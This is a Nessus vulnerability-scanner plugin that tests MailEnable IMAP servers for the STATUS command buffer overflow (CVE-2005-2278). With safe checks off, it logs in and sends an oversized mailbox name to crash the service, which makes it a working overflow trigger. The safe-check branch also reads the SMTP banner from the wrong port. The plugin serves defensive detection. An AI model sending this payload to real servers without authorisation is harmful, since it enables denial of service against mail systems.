#
# (C) Tenable Network Security
#


if (description) {
  script_id(19193);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-2278");
  script_bugtraq_id(14243);
  script_xref(name:"OSVDB", value:"17844");

  name["english"] = "MailEnable IMAP STATUS Command Buffer Overflow";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote IMAP server is affected by a buffer overflow vulnerability. 

Description :

The remote host is running a version of MailEnable's IMAP service that
is prone to a buffer overflow vulnerability triggered when processing
a STATUS command with a long mailbox name.  Once authenticated, an
attacker can exploit this flaw to execute arbitrary code subject to
the privileges of the affected application. 

See also : 

http://www.coresecurity.com/common/showdoc.php?idx=467&idxseccion=10
http://archives.neohapsis.com/archives/bugtraq/2005-07/0205.html

Solution : 

Upgrade to MailEnable Professional 1.6 or later or to MailEnable
Enterprise Edition 1.1 or later. 

Risk factor : 

Medium / CVSS Base Score : 6 
(AV:R/AC:L/Au:R/C:C/A:C/I:C/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for STATUS command buffer overflow in MailEnable's IMAP service";
  script_summary(english:summary["english"]);
 
  script_category(ACT_MIXED_ATTACK);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencie("find_service2.nasl");
  script_exclude_keys("imap/false_imap");
  script_require_keys("imap/login", "imap/password");
  script_require_ports("Services/smtp", 25, "Services/imap", 143);

  exit(0);
}


include("global_settings.inc");
include("imap_func.inc");
include("smtp_func.inc");


port = get_kb_item("Services/imap");
if (!port) port = 143;
if (!get_port_state(port) || get_kb_item("imap/false_imap")) exit(0);


# Make sure the banner is for MailEnable.
banner = get_imap_banner(port:port);
if (!banner || "* OK IMAP4rev1 server ready" >!< banner) exit(0);


# If safe checks are enabled...
if (safe_checks()) {
  # Check the version number from the SMTP server's banner.
  smtp_port = get_kb_item("Services/smtp");
  if (!smtp_port) port = 25;
  if (!get_port_state(smtp_port)) exit(0);
  if (get_kb_item('SMTP/'+smtp_port+'/broken')) exit(0);

  banner = get_smtp_banner(port:port);
  if (banner =~ "Mail(Enable| Enable SMTP) Service") {
    # nb: Standard Edition seems to format version as "1.71--" (for 1.71),
    #     Professional Edition formats it like "0-1.2-" (for 1.2), and
    #     Enterprise Edition formats it like "0--1.1" (for 1.1).
    ver = eregmatch(pattern:"Version: (0-+)?([0-9][^- ]+)-*", string:banner);
    if (ver == NULL) {
      if (log_verbosity > 1) debug_print("can't determine version of MailEnable's SMTP connector service!");
      exit(1);
    }
    if (ver[1] == NULL) {
      edition = "Standard";
    }
    else if (ver[1] == "0-") {
      edition = "Professional";
    }
    else if (ver[1] == "0--") {
      edition = "Enterprise";
    }
    if (isnull(edition)) {
      if (log_verbosity > 1) debug_print("can't determine edition of MailEnable's SMTP connector service!");
      exit(1);
    }
    ver = ver[2];

    if (
      # nb: Professional versions < 1.6 are vulnerable.
      (edition == "Professional" && ver =~ "^1\.[0-5]") ||
      # nb: Enterprise versions < 1.1 are vulnerable.
      (edition == "Enterprise" && ver =~ "^1\.0")
    ) {
      security_warning(port);
    }
  }
 exit(0);
}
# Otherwise, try to exploit it.
else {
  user = get_kb_item("imap/login");
  pass = get_kb_item("imap/password");
  if ((user == "") || (pass == "")) {
    if (log_verbosity > 1) debug_print("imap/login and/or imap/password are empty; skipped!", level:0);
    exit(0);
  }

  # Establish a connection.
  tag = 0;
  soc = open_sock_tcp(port);
  if (!soc) exit(0);

  # Read banner.
  s = recv_line(socket:soc, length:1024);
  if (!strlen(s)) {
    close(soc);
    exit(0);
  }

  # Log in.
  ++tag;
  c = string("nessus", string(tag), " LOGIN ", user, " ", pass);
  send(socket:soc, data:string(c, "\r\n"));
  while (s = recv_line(socket:soc, length:1024)) {
    s = chomp(s);
    m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
    if (!isnull(m)) {
      resp = m[1];
      break;
    }
    resp = "";
  }

  # If successful, try to exploit the flaw.
  if (resp && resp =~ "OK") {
    ++tag;
    c = string(
      "nessus", string(tag), 
      ' STATUS "', crap(10540), '" (UIDNEXT UIDVALIDITY MESSAGES UNSEEN RECENT)'
    );
    send(socket:soc, data:string(c, "\r\n"));
    while (s = recv_line(socket:soc, length:1024)) {
      s = chomp(s);
      m = eregmatch(pattern:string("^nessus", string(tag), " (OK|BAD|NO)"), string:s, icase:TRUE);
      if (!isnull(m)) {
        resp = m[1];
        break;
      }
      resp = "";
    }

    # If there's no response, make sure it's really down.
    if (!s || !resp) {
      # Try to reestablish a connection and read the banner.
      soc2 = open_sock_tcp(port);
      if (soc2) s2 = recv_line(socket:soc2, length:1024);

      # If we couldn't establish the connection or read the banner,
      # there's a problem.
      if (!soc2 || !strlen(s2)) {
        security_warning(port);
        exit(0);
      }
      close(soc2);
    }
  }
  # Else, let user know there was a problem with the credentials.
  else if (resp && resp =~ "NO") {
    if (log_verbosity > 1) debug_print("couldn't login with supplied imap credentials!", level:0);
  }

  # Be nice and logout if there's still a connection.
  if (soc) {
    ++tag;
    c = string("nessus", string(tag), " LOGOUT");
    send(socket:soc, data:string(c, "\r\n"));
    close(soc);
  }
}
